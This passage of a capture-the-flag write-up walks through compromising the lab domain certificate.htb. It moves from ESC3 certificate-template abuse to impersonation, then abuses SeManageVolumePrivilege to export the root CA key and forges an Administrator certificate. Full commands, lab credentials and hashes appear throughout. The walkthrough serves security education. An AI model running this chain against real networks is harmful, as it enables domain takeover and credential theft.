[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250725013657_Certipy.txt'
[*] Wrote text output to '20250725013657_Certipy.txt'
[*] Saving JSON output to '20250725013657_Certipy.json'
[*] Wrote JSON output to '20250725013657_Certipy.json'
```

<p class="indent-paragraph">
An enumeration using <code>Certipy</code> revealed that the certificate template <code>Delegated-CRA</code> is misconfigured with the <code>Certificate Request Agent</code> EKU enabled. This configuration exposes the domain to the ESC3 attack path, allowing eligible users—such as those in the <code>Domain CRA Managers</code> group—to request certificates on behalf of other users. The template does not require manager approval, and it issues exportable private keys, which makes it highly exploitable for privilege escalation within the domain.
</p>

```
~$ cat 20250725013657_Certipy.txt                                         
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Enabled                             : True
    Extended Key Usage                  : Certificate Request Agent
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```

<p class="indent-paragraph">
To map privilege relationships and identify potential abuse paths within the Active Directory environment, <code>bloodhound-python</code> was executed using valid credentials for the user <code>Lion.SK</code><span class="codefix">.</span> The tool successfully obtained a Kerberos TGT and connected to the domain controller <code>dc01.certificate.htb</code> via LDAP. It enumerated 3 computers, 19 users, 58 groups, 2 Group Policy Objects (GPOs), and 19 containers<span class="codefix">.</span> Despite a minor timeout during SID resolution, the data was ingested into BloodHound, setting the stage for a deeper analysis of certificate template permissions—particularly focusing on abuse vectors involving enrollment and delegation rights<span class="codefix">.</span>
</p>

```
~$ bloodhound-python -u 'Lion.SK' -p '!QAZ2wsx' -d certificate.htb -dc dc01.certificate.htb -c All -ns <IP>
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certificate.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.certificate.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.certificate.htb
INFO: Found 19 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WS-05.certificate.htb
INFO: Querying computer: WS-01.certificate.htb
INFO: Querying computer: DC01.certificate.htb
WARNING: Connection timed out while resolving sids
INFO: Done in 00M 27S
```

<p class="indent-paragraph">
The following graph extracted from BloodHound highlights the group membership structure for <code>LION.SK@CERTIFICATE.HTB</code><span class="codefix">.</span> As shown, this user is part of the <code>DOMAIN CRA MANAGERS</code> group, which includes other accounts such as <code>EVA.F</code> and <code>ALEX.D</code><span class="codefix">.</span> This group holds elevated permissions over the <code>Delegated-CRA</code> certificate template, enabling its members to act as enrollment agents and potentially request certificates on behalf of other users — a critical factor in the ESC3 vulnerability path.
</p>

<div style="margin-top: 20px;">
  <img src="/img/redteam/htb/certificate/bloodhound-lion.png" alt="BloodHound-Lion" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
</div>

### 🎭 Privilege Escalation via ESC3 Vulnerability and Certificate Impersonation

<p class="indent-paragraph">
Analysis in BloodHound revealed that <code>Ryan.K@CERTIFICATE.HTB</code> is a member of the <code>Domain Storage Managers</code> group, whose members are responsible for critical volume-level tasks such as maintaining, defragmenting, and managing partitions and disks. This strategic role within the infrastructure implies elevated privileges and operational trust, making Ryan an ideal target for certificate-based impersonation attacks.
</p>

<div style="margin-top: 20px;">
  <img src="/img/redteam/htb/certificate/bloodhound-ryan.png" alt="BloodHound-ryan" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
</div>

<p class="indent-paragraph">
To exploit the ESC3 vulnerability within Active Directory Certificate Services (ADCS), a certificate was requested using the <code>Delegated-CRA</code> template, which includes the <code>Certificate Request Agent</code> EKU<span class="codefix">.</span> This template allows the requester to impersonate other users by generating valid certificates on their behalf<span class="codefix">.</span> The <code>certipy</code> tool was used with Lion.SK’s credentials to successfully obtain a certificate from the <code>Certificate-LTD-CA</code> authority<span class="codefix">.</span> The result was a valid <code>.pfx</code> file, containing a certificate and private key for the user <code>Lion.SK</code><span class="codefix">,</span> which can now be leveraged in further attacks such as forging TGTs or impersonating privileged accounts<span class="codefix">.</span>
</p>

```
~$ certipy-ad req -u 'lion.sk@CERTIFICATE.HTB' -p '!QAZ2wsx' -dc-ip '<IP>' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 38
[*] Successfully requested certificate
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saving certificate and private key to 'lion.sk.pfx'
[*] Wrote certificate and private key to 'lion.sk.pfx'
```

<p class="indent-paragraph">
Leveraging the previously obtained <code>lion.sk.pfx</code> certificate, a second request was issued using the <code>SignedUser</code> template and the <code>on-behalf-of</code> flag targeting the user <code>ryan.k</code><span class="codefix">.</span> This impersonation request was possible due to the <code>Certificate Request Agent</code> EKU present in the vulnerable <code>Delegated-CRA</code> template<span class="codefix">.</span> The command generated a new certificate and private key for <code>ryan.k</code> without requiring that user’s credentials<span class="codefix">.</span> The resulting <code>ryan.k.pfx</code> file enables authentication as <code>ryan.k</code><span class="codefix">,</span> paving the way for lateral movement or privilege escalation depending on the target account’s rights and group memberships<span class="codefix">.</span>
</p>

```
~$ certipy-ad req -u 'lion.sk@CERTIFICATE.HTB' -p '!QAZ2wsx' -dc-ip '<IP>' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 39
[*] Successfully requested certificate
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'
```

<p class="indent-paragraph">
With the impersonated certificate in hand, the next step involved authenticating as <code>ryan.k</code> using <code>certipy-ad auth</code> and the <code>ryan.k.pfx</code> file<span class="codefix">.</span> This process successfully generated a Kerberos TGT and stored it as a credential cache file (<code>ryan.k.ccache</code>)<span class="codefix">.</span> Additionally, Certipy extracted the NTLM hash for the impersonated user, which can be reused in pass-the-hash attacks or other post-exploitation scenarios<span class="codefix">.</span> This confirmed full impersonation and control over the account <code>ryan.k@certificate.htb</code><span class="codefix">,</span> completing a crucial step in the privilege escalation chain via ESC3 abuse<span class="codefix">.</span>
</p>

```
~$ certipy-ad auth -pfx 'ryan.k.pfx' -dc-ip '<IP>'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
```

<p class="indent-paragraph">
To assess the effective permissions and security context of the compromised user <code>ryan.k</code><span class="codefix">,</span> the command <code>whoami /all</code> was executed via <code>evil-winrm</code><span class="codefix">.</span> The output confirmed that the account is a member of several local and domain-level groups, including the <code>Domain Storage Managers</code><span class="codefix">,</span> a group often associated with elevated storage management capabilities<span class="codefix">.</span> More importantly, the privileges section revealed the presence and active state of <code>SeManageVolumePrivilege</code><span class="codefix">,</span> which allows a user to perform volume-level maintenance tasks<span class="codefix">.</span> This privilege, combined with the group memberships, indicates a potential vector for privilege escalation through abuse of volume operations or storage-related attack paths<span class="codefix">.</span>
</p>

```
~$ evil-winrm -i DC01.certificate.htb -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6                   
                                        
Evil-WinRM shell v3.7

*Evil-WinRM* PS C:\Users\Ryan.K> whoami /all

USER INFORMATION
----------------

User Name          SID
================== =============================================
certificate\ryan.k S-1-5-21-515537669-4223687196-3249690583-1117


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
CERTIFICATE\Domain Storage Managers        Group            S-1-5-21-515537669-4223687196-3249690583-1118 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
~$ SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

<p class="indent-paragraph">
Following the privilege assessment, the command <code>certutil -store My</code> was executed to enumerate the certificates stored in the current user's personal store. Among the listed entries, the presence of certificates issued by both the <code>Certificate-LTD-CA</code> and <code>certificate-DC01-CA</code> authorities was confirmed. Notably, one of the certificates references the <code>DomainController</code> template, which is commonly used for domain controller authentication and could imply elevated trust if misused<span class="codefix">.</span> Although the stored keysets were missing, the existence of such certificates reveals valuable insight into the domain’s certificate infrastructure and its integration with the compromised user’s context.
</p>

```
~$ *Evil-WinRM* PS C:\Users\Ryan.K> certutil -Store My
My "Personal"
================ Certificate 0 ================
Archived!
Serial Number: 472cb6148184a9894f6d4d2587b1b165
Issuer: CN=certificate-DC01-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:30 PM
 NotAfter: 11/3/2029 3:40 PM
Subject: CN=certificate-DC01-CA, DC=certificate, DC=htb
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Cert Hash(sha1): 82ad1e0c20a332c8d6adac3e5ea243204b85d3a7
  Key Container = certificate-DC01-CA
  Provider = Microsoft Software Key Storage Provider
Missing stored keyset

================ Certificate 1 ================
Serial Number: 5800000002ca70ea4e42f218a6000000000002
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 8:14 PM
 NotAfter: 11/3/2025 8:14 PM
Subject: CN=DC01.certificate.htb
Certificate Template Name (Certificate Type): DomainController
Non-root Certificate
Template: DomainController, Domain Controller
Cert Hash(sha1): 779a97b1d8e492b5bafebc02338845ffdff76ad2
  Key Container = 46f11b4056ad38609b08d1dea6880023_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft RSA SChannel Cryptographic Provider
Missing stored keyset

================ Certificate 2 ================
~$ Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Provider = Microsoft Software Key Storage Provider
Missing stored keyset
CertUtil: -store command completed successfully.
```

<p class="indent-paragraph">
Following the discovery that the user <code>Ryan.K</code> possessed the <code>SeManageVolumePrivilege</code> right, a lesser-known but effective privilege escalation technique was identified. This specific privilege allows a user to perform maintenance tasks on system volumes, which can be exploited to create arbitrary files on disk with <code>SYSTEM-level</code> ownership. To weaponize this capability, the open-source tool <a href="https://github.com/CsEnox/SeManageVolumeExploit" target="_blank">SeManageVolumeExploit</a> by <code>CsEnox</code> was selected.
</p>

```
~$ curl -LO https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100 12288  100 12288    0     0  37493      0 --:--:-- --:--:-- --:--:-- 37493
                                                                                                                                                                                                                          
~$ file SeManageVolumeExploit.exe                                                                                                     
SeManageVolumeExploit.exe: PE32+ executable for MS Windows 6.00 (console), x86-64, 6 sections
```

<p class="indent-paragraph">
To exploit the <code>SeManageVolumePrivilege</code><span class="codefix">,</span> the binary <code>SeManageVolumeExploit.exe</code> was uploaded and executed with the target path <code>C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys</code><span class="codefix">.</span> This path stores certificate private keys, and the exploit creates fake key containers matching existing certificates. As a result, Windows stopped reporting "Missing stored keyset", allowing the private key to be accessed and the certificate to be exported successfully.
</p>

```
~$ *Evil-WinRM* PS C:\Users\Ryan.K> upload SeManageVolumeExploit.exe
                                        
Info: Uploading /home/kali/ctf-player/certificate/SeManageVolumeExploit.exe to C:\Users\Ryan.K\SeManageVolumeExploit.exe
                                        
Data: 16384 bytes of 16384 bytes copied
                                        
Info: Upload successful!

~$ *Evil-WinRM* PS C:\Users\Ryan.K> .\SeManageVolumeExploit.exe C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys
Entries changed: 844

DONE
```

<p class="indent-paragraph">
During privilege escalation, it was confirmed that the directory <code>C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys</code> granted write access to <code>Everyone</code> and full control to <code>Users</code><span class="codefix">.</span> This permissive configuration enabled the injection of a fake key container by the exploit. The focus was placed on <strong>Certificate 2</strong>, a root CA with high trust and exportable potential. After running <code>certutil -store My</code><span class="codefix">,</span> the output showed <code>Signature test passed</code><span class="codefix">,</span> confirming that the private key was now accessible.
</p>



```
~$ *Evil-WinRM* PS C:\Users\Ryan.K> icacls "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys"
C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys Everyone:(R,W)
                                                BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files

~$ *Evil-WinRM* PS C:\Users\Ryan.K> certutil -Store My
My "Personal"
================ Certificate 0 ================
Archived!
Serial Number: 472cb6148184a9894f6d4d2587b1b165
Issuer: CN=certificate-DC01-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:30 PM
 NotAfter: 11/3/2029 3:40 PM
Subject: CN=certificate-DC01-CA, DC=certificate, DC=htb
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Cert Hash(sha1): 82ad1e0c20a332c8d6adac3e5ea243204b85d3a7
  Key Container = certificate-DC01-CA
  Unique container name: 6f761f351ca79dc7b0ee6f07b40ae906_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed

================ Certificate 1 ================
Serial Number: 5800000002ca70ea4e42f218a6000000000002
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 8:14 PM
 NotAfter: 11/3/2025 8:14 PM
Subject: CN=DC01.certificate.htb
Certificate Template Name (Certificate Type): DomainController
Non-root Certificate
Template: DomainController, Domain Controller
Cert Hash(sha1): 779a97b1d8e492b5bafebc02338845ffdff76ad2
  Key Container = 46f11b4056ad38609b08d1dea6880023_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Simple container name: te-DomainController-3ece1f1c-d299-4a4d-be95-efa688b7fee2
  Provider = Microsoft RSA SChannel Cryptographic Provider
Private key is NOT exportable
Encryption test passed

================ Certificate 2 ================
~$ Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
~$ Signature test passed
CertUtil: -store command completed successfully.
```

<p class="indent-paragraph">
With the private key now accessible, the attacker executed <code>certutil -exportPFX</code> targeting the certificate with serial number <code>75b2f4bbf31f108945147b466131bdca</code><span class="codefix">.</span> The command successfully exported the root CA certificate <code>Certificate-LTD-CA</code> along with its private key, as indicated by the <code>Signature test passed</code> message and the final confirmation. This validated that the previous privilege escalation steps had effectively restored the keyset, enabling full certificate extraction.
</p>


```
~$ *Evil-WinRM* PS C:\Users\Ryan.K> certutil -exportPFX My 75b2f4bbf31f108945147b466131bdca Certificate-LTD-CA.pfx
My "Personal"
================ Certificate 2 ================
~$ Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file Certificate-LTD-CA.pfx:
Enter new password:
Confirm new password:
~$ CertUtil: -exportPFX command completed successfully.
```

<p class="indent-paragraph">
After successfully exporting the <code>Certificate-LTD-CA.pfx</code> file, the attacker proceeded to download it to their local machine using the built-in <code>download</code> functionality in Evil-WinRM. The file transfer completed without errors, making the root CA certificate and its private key available for offline use in subsequent attacks.
</p>

```
~$ *Evil-WinRM* PS C:\Users\Ryan.K> download Certificate-LTD-CA.pfx
                                        
Info: Downloading C:\Users\Ryan.K\Certificate-LTD-CA.pfx to Certificate-LTD-CA.pfx
                                        
Info: Download successful!
```

<p class="indent-paragraph">
Upon attempting authentication with <code>certipy-ad auth</code> using the downloaded PFX, an error was returned indicating a name mismatch and the absence of a valid identity in the certificate. This happened because the original root CA certificate does not contain a Subject Alternative Name (SAN) or User Principal Name (UPN) matching the target user <code>Administrator@certificate.htb</code><span class="codefix">.</span> To bypass this limitation, the attacker used Certipy’s <code>forge</code> command to generate a fake certificate signed by the trusted CA, embedding the desired UPN. This resulted in a forged certificate <code>forged_admin.pfx</code><span class="codefix">,</span> which could now be used for successful impersonation.
</p>

```
~$ certipy-ad auth -pfx Certificate-LTD-CA.pfx -dc-ip <IP> -user Administrator -domain certificate.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[-] Name mismatch between certificate and user 'administrator'
[-] See the wiki for more information
                                                                                                                                                                         
~$ certipy-ad forge -ca-pfx Certificate-LTD-CA.pfx -upn 'administrator@certificate.htb' -out forged_admin.pfx 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'forged_admin.pfx'
[*] Wrote forged certificate and private key to 'forged_admin.pfx'
```

<p class="indent-paragraph">
Before attempting authentication with the forged certificate, the attacker ensured the local system time was synchronized with the Domain Controller using <code>ntpdate</code><span class="codefix">.</span> This step is critical, as Kerberos relies on tight time alignment to validate TGTs; significant drift would cause ticket requests to fail. Once the time was aligned, the attacker authenticated as <code>administrator@certificate.htb</code> using the forged certificate via <code>certipy-ad auth</code><span class="codefix">.</span> The operation succeeded, resulting in a valid TGT and the extraction of the NTLM hash for the domain Administrator account, completing the privilege escalation chain.
</p>

```
~$ certipy-ad auth -dc-ip '<IP>' -pfx 'forged_admin.pfx' -username 'administrator' -domain 'certificate.htb'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certificate.htb'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
~$ [*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

<p class="indent-paragraph">
With the forged administrator certificate and corresponding NT hash in hand, the attacker established a remote session using <code>Evil-WinRM</code> and successfully authenticated as <code>Administrator</code> on the Domain Controller. Navigating to the Administrator’s desktop, the attacker accessed the <code>root.txt</code> flag, confirming full domain compromise and the successful completion of the privilege escalation lab.
</p>

```
~$ evil-winrm -i DC01.certificate.htb -u administrator -H d804304519bf0143c14cbf1c024408c6 
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
~$ *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
**********************************
```







